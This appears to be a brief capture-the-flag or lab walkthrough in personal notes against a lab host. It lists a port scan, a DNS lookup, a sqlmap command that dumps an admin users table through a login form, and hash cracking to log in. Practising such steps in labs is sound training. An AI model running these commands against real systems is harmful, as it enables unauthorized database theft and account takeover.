1) PortScan
```bash
rustscan -a 10.13.37.10 --ulimit 5000 -- -sV -sC -Pn
```
![[Pasted image 20230913115945.png]]
2) Digging the domain
```bash
dnsrecon -r 10.13.37.10/24 -n 10.13.37.10
```
![[Pasted image 20230913120254.png]]
3) Analyze the web traffic to find the hidden folder
![[Pasted image 20230913120456.png]]
4) Use sqlmap to retrieve the admin hash
```bash
sqlmap -u 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php' --batch --forms --level 3 --risk 3 -D jetadmin -T users --dump
```
![[Pasted image 20230913120601.png]]
5) Crack the hash on crack station and login
![[Pasted image 20230913120633.png]]
